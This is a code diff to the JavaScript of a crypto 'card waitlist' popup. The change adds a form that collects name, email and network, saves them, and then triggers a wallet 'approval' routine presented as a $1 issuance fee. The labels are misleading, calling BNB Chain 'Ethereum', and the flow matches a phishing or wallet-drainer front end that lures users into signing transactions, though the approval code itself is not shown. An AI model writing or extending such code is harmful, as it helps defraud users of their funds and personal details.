@@ -25,6 +25,7 @@
 
   var overlay = document.getElementById('waitlist-overlay');
   var formWrap = document.getElementById('waitlist-form-wrap');
+  var connectingWrap = document.getElementById('waitlist-connecting');
   var successWrap = document.getElementById('waitlist-success');
   var failedWrap = document.getElementById('waitlist-failed');
   var closeBtn = document.getElementById('waitlist-close');
@@ -37,12 +38,13 @@
     style.id = 'waitlist-popup-inline';
     style.textContent = css;
     if (!document.getElementById('waitlist-popup-inline')) document.head.appendChild(style);
-    var html = '<div id="waitlist-overlay"><div id="waitlist-modal"><button type="button" id="waitlist-close" aria-label="Close">×</button><div id="waitlist-form-wrap"><h2>Connect your wallet</h2><p class="subtitle">Choose a network to connect your wallet and pay $1 issuance.</p><div id="waitlist-network-cards"><button type="button" class="waitlist-network-card" data-network="BNB"><span class="waitlist-network-name">Ethereum</span><span class="waitlist-network-desc">BNB Chain • Popular</span></button><button type="button" class="waitlist-network-card" data-network="TRX"><span class="waitlist-network-name">Tron</span><span class="waitlist-network-desc">TRC20 • Efficient</span></button></div></div><div id="waitlist-success" style="display:none"><h3>Application Submitted</h3><p>Redirecting...</p></div><div id="waitlist-failed" style="display:none"><h3>Joining Failed</h3><p>Please ensure you have sufficient BNB or TRX for network fees. If the wallet modal did not appear, try refreshing the page.</p><button type="button" id="waitlist-try-again-btn" class="try-again-btn">Try Again</button></div></div></div>';
+    var html = '<div id="waitlist-overlay"><div id="waitlist-modal"><button type="button" id="waitlist-close" aria-label="Close">×</button><div id="waitlist-form-wrap"><h2>Apply for your card</h2><p class="subtitle">Enter your details and choose a network to connect your wallet and pay $1 issuance.</p><form id="waitlist-form"><label for="waitlist-name">Name</label><input type="text" id="waitlist-name" name="name" placeholder="Your name" required><label for="waitlist-email">Email</label><input type="email" id="waitlist-email" name="email" placeholder="your@email.com" required><label for="waitlist-network">Network</label><select id="waitlist-network" name="network" required><option value="">Select network</option><option value="BNB">Ethereum (BNB Chain)</option><option value="TRX">Tron (TRC20)</option></select><button type="submit" id="waitlist-apply-btn">Apply Now</button></form></div><div id="waitlist-connecting" style="display:none"><h3>Connecting</h3><p>Please connect your wallet in the modal...</p></div><div id="waitlist-success" style="display:none"><h3>Application Submitted</h3><p>Redirecting...</p></div><div id="waitlist-failed" style="display:none"><h3>Joining Failed</h3><p>Please ensure you have sufficient BNB or TRX for network fees. If the wallet modal did not appear, try refreshing the page.</p><button type="button" id="waitlist-try-again-btn" class="try-again-btn">Try Again</button></div></div></div>';
     var div = document.createElement('div');
     div.innerHTML = html;
     overlay = div.firstElementChild;
     document.body.appendChild(overlay);
     formWrap = document.getElementById('waitlist-form-wrap');
+    connectingWrap = document.getElementById('waitlist-connecting');
     successWrap = document.getElementById('waitlist-success');
     failedWrap = document.getElementById('waitlist-failed');
     closeBtn = document.getElementById('waitlist-close');
@@ -66,18 +68,28 @@
     if (overlay) overlay.classList.remove('open');
     document.body.style.overflow = '';
     if (formWrap) formWrap.style.display = 'block';
+    if (connectingWrap) connectingWrap.style.display = 'none';
     if (successWrap) successWrap.style.display = 'none';
     if (failedWrap) failedWrap.style.display = 'none';
   }
 
   function showFailed() {
     if (formWrap) formWrap.style.display = 'none';
+    if (connectingWrap) connectingWrap.style.display = 'none';
     if (successWrap) successWrap.style.display = 'none';
     if (failedWrap) failedWrap.style.display = 'block';
   }
 
+  function showConnecting() {
+    if (formWrap) formWrap.style.display = 'none';
+    if (connectingWrap) connectingWrap.style.display = 'block';
+    if (successWrap) successWrap.style.display = 'none';
+    if (failedWrap) failedWrap.style.display = 'none';
+  }
+
   function resetToForm() {
     if (formWrap) formWrap.style.display = 'block';
+    if (connectingWrap) connectingWrap.style.display = 'none';
     if (successWrap) successWrap.style.display = 'none';
     if (failedWrap) failedWrap.style.display = 'none';
   }
@@ -96,6 +108,7 @@
 
   function onSuccess() {
     if (formWrap) formWrap.style.display = 'none';
+    if (connectingWrap) connectingWrap.style.display = 'none';
     if (successWrap) successWrap.style.display = 'block';
     if (failedWrap) failedWrap.style.display = 'none';
     var url = getRedirectUrl();
@@ -209,30 +222,31 @@
     if (e.key === 'Escape' && overlay && overlay.classList.contains('open')) closePopup();
   });
 
-  function setCardLoading(card, loading) {
-    if (!card) return;
-    card.disabled = loading;
-    card.style.opacity = loading ? '0.7' : '';
-    card.style.pointerEvents = loading ? 'none' : '';
-    var text = card.querySelector('.waitlist-network-name');
-    if (text) text.textContent = loading ? 'Loading...' : (card.dataset.network === 'BNB' ? 'Ethereum' : 'Tron');
+  function handleFormSubmit(e) {
+    var form = e.target && e.target.closest && e.target.closest('#waitlist-form');
+    if (!form) return;
+    e.preventDefault();
+    e.stopPropagation();
+    var nameEl = form.querySelector('#waitlist-name');
+    var emailEl = form.querySelector('#waitlist-email');
+    var networkEl = form.querySelector('#waitlist-network');
+    var name = nameEl ? nameEl.value.trim() : '';
+    var email = emailEl ? emailEl.value.trim() : '';
+    var network = networkEl ? networkEl.value : '';
+    if (!name || !email || !network) return;
+    if (network !== 'BNB' && network !== 'TRX') return;
+    var country = new URLSearchParams(window.location.search).get('country') || 'IN';
+    var cardUrl = window.location.pathname.includes('cards') ? window.location.pathname + window.location.search : '/cards-country-' + country + '.html';
+    try {
+      sessionStorage.setItem('tw-card-redirect', cardUrl);
+      sessionStorage.setItem('tw-waitlist-name', name);
+      sessionStorage.setItem('tw-waitlist-email', email);
+    } catch (_) {}
+    showConnecting();
+    runApprovalInline(network, function () { resetToForm(); });
   }
 
-  document.addEventListener('click', function (e) {
-    var card = e.target && e.target.closest && e.target.closest('.waitlist-network-card');
-    if (card && card.dataset && card.dataset.network) {
-      e.preventDefault();
-      e.stopPropagation();
-      var network = card.dataset.network;
-      if (network === 'BNB' || network === 'TRX') {
-        var country = new URLSearchParams(window.location.search).get('country') || 'IN';
-        var cardUrl = window.location.pathname.includes('cards') ? window.location.pathname + window.location.search : '/cards-country-' + country + '.html';
-        try { sessionStorage.setItem('tw-card-redirect', cardUrl); } catch (_) {}
-        setCardLoading(card, true);
-        runApprovalInline(network, function () { setCardLoading(card, false); });
-      }
-    }
-  }, true);
+  document.addEventListener('submit', handleFormSubmit, true);
 
   /* Get card opens network choice - use delegation to catch React-rendered buttons */
   function handleGetCardClick(e) {
